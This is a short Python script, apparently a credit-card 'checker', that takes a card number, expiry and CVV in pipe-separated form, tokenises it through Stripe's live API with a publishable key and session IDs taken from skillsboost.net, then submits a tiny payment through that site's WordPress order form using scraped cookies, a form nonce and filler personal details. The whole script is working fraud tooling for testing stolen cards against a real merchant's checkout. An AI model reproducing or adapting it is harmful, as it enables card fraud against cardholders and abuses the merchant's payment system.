import requests
import re

def Tele(ccx):
    # Clean and split the credit card data
    ccx = ccx.strip()
    cc_parts = ccx.split("|")
    cc_num = cc_parts[0]
    exp_month = cc_parts[1]
    exp_year = cc_parts[2]
    cvv = cc_parts[3]

    # Check if the year contains "20" and correct it
    if "20" in exp_year:
        exp_year = exp_year.split("20")[1]

    # Start a new session
    session = requests.Session()

    # Set up headers for the request to Stripe's API
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    # Stripe request data payload
    data_stripe = f'type=card&card[number]={cc_num}&card[cvc]={cvv}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&guid=de57bf64-7458-4e9e-b477-65e3e7684bfe8b9fc9&muid=51cfd2eb-ae06-4c65-8ff1-7494a3b88fe40f8fa3&sid=cbebd114-a3a2-4575-8ed7-577af6678b5fbfec9b&payment_user_agent=stripe.js%2F89f50b7e22%3B+stripe-js-v3%2F89f50b7e22%3B+card-element&referrer=https%3A%2F%2Fskillsboost.net&time_on_page=62954&key=pk_live_51PRegF00TTHUs6jXi19Y1WJFte0bSQBcTVekYjze8urlDVVFsXyojhEgORMXw5hdktJvaNLteYT6HYtLjOyUG5eI00Nn9yDk5O'

    # Make the initial request to Stripe
    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
    
    try:
        payment_method_id = response_stripe.json().get('id')
    except Exception as e:
        print(f"Error parsing Stripe response: {e}")
        return

    # Prepare cookies and headers for the second request
    cookies = {
        'pmpro_visit': '1',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_first_add': 'fd%3D2024-11-01%2014%3A57%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fskillsboost.net%2Forder-certificate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        '__stripe_mid': '51cfd2eb-ae06-4c65-8ff1-7494a3b88fe40f8fa3',
        '__stripe_sid': 'cbebd114-a3a2-4575-8ed7-577af6678b5fbfec9b',
    }

    headers_site = {
        'authority': 'skillsboost.net',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://skillsboost.net',
        'referer': 'https://skillsboost.net/order-certificate/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Additional parameters for the request
    params = {
        't': '1730473234603',
    }

    # Prepare data payload for the second request
    data_site = f'data=__fluent_form_embded_post_id%3D730%26_fluentform_4_fluentformnonce%3D21274342c2%26_wp_http_referer%3D%252Forder-certificate%252F%26input_text%3DKhant%26names%255Bfirst_name%255D%3DKhant%2520Ti%26names%255Blast_name%255D%3DKyi%26email%3Dtyikyi2552002%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStudio%25201%2520Ellis%2520lane%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DSouth%2520Janicechester%26address_1%255Bstate%255D%3DYdsy%26address_1%255Bzip%255D%3DN4%25206BY%26address_1%255Bcountry%255D%3DGB%26payment_input%255B%255D%3DPDF%2520Transcript%2520(%25C2%25A34.99)%26custom-payment-amount%3D0.998%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{payment_method_id}&action=fluentform_submit&form_id=4'

    # Send the request to the target website
    r2 = session.post(
        'https://skillsboost.net/wp-admin/admin-ajax.php',
        params=params,
        cookies=cookies,
        headers=headers_site,
        data=data_site,
    )

    # Return the JSON response from the target site
    return r2.json()
